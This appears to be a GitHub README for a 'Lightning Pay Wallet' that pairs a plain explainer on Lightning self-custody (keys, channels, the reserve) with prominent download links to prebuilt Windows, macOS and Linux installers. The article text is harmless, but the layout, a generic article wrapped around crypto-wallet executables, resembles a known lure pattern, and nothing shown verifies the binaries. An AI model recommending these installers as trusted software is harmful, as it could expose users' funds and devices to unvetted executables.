<p align="center"><img src="assets/banner-article.png" alt="Lightning Pay Wallet"></p>
# What you actually hold in a Lightning wallet, and how keys are kept
Keys on your device, a balance that is half on-chain and half in channels, and what that means.
<p align="center"><a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0350c2?style=for-the-badge&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Windows"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0350c2?style=for-the-badge&logo=apple&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD macOS"></a> <a href="https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0350c2?style=for-the-badge&logo=linux&logoColor=ffffff&labelColor=091640" alt="DOWNLOAD Linux"></a></p>
<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| ![Windows](https://img.shields.io/badge/platform-Windows-fed023?style=flat-square&logo=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=ffffff&labelColor=091640) | Windows 10 (1909) or later, 64-bit | [lightning-pay-wallet-windows-v1.2.1.exe](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-windows-v1.2.1.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-fed023?style=flat-square&logo=apple&logoColor=ffffff&labelColor=091640) | macOS 12 or later | [lightning-pay-wallet-macos-v1.2.1.dmg](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-macos-v1.2.1.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-fed023?style=flat-square&logo=linux&logoColor=ffffff&labelColor=091640) | x64, Ubuntu 20.04 or later, or equivalent | [lightning-pay-wallet-linux-v1.2.1.zip](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/download/v1.2.1/lightning-pay-wallet-linux-v1.2.1.zip) |

</div>
Every file above is published on [the Lightning Pay Wallet release page](https://github.com/bitcoin-lightning-wallet/lightning-pay-desktop/releases/tag/v1.2.1) under the same names, and that page is the only place the installers should come from.
> **Only download from this GitHub release page.**

"Self-custody" is easy to say and worth unpacking, because a Lightning wallet holds two things that
behave differently: on-chain bitcoin you control directly, and channel balances that exist as an
agreement with a counterparty.

## The keys

The wallet generates keys on your device and keeps them there. Nothing is uploaded, and there is no
server-side copy. That is what makes the wallet non-custodial, and it is also why the phrase is the
entire recovery story.

Keys control addresses. Addresses hold on-chain bitcoin. If you hold the keys, you can spend that
bitcoin without anyone's permission.

## The channels

A Lightning balance is not a pile of coins sitting at an address. It is a share of a channel, which is
a funded account between two nodes. The channel is enforced on-chain, but while it is open the balance
moves inside it without touching the chain.

That is why a Lightning balance is fast and why it is also more involved to back up: the keys prove the
channel is yours, and the channel state proves how much of it is yours.

## The reserve

A wallet may hold back a small amount so it can afford to close a channel later. That reserve is why a
balance sometimes refuses to empty completely, and it is not a fee or a bug.

## What nobody else can do

No company can freeze the balance, move it, or lose it for you. There is no account to suspend. That
is the property people mean by self-custody, and it holds even when the wallet's maker disappears, as
[what happens if the wallet company disappears](https://github.com/bitcoin-lightning-wallet/wallet-recovery-guides/blob/HEAD/if-the-wallet-company-shuts-down.md)
sets out.

What somebody else *can* do is fail to cooperate: a counterparty that goes offline can delay a channel
close, though the protocol's timers eventually return your share.

## What you are responsible for

The phrase, the channel backup if the wallet makes one, the device, and the discipline of never
entering the phrase anywhere but the wallet. Everything else is the software's job.

## Questions people ask

### Do I own the bitcoin in a channel?

Yes, your share of it, enforced by the channel's on-chain contract. It is yours in a different way
than an address balance, not in a weaker one.

### Can the wallet see my balance?

The wallet is software on your machine. There is no operator watching a balance because there is no
operator holding one.

### Why does the balance split between on-chain and Lightning?

Because they are different rails. On-chain is final and slower; Lightning is instant and lives in
channels. The split is a choice, not a limitation.
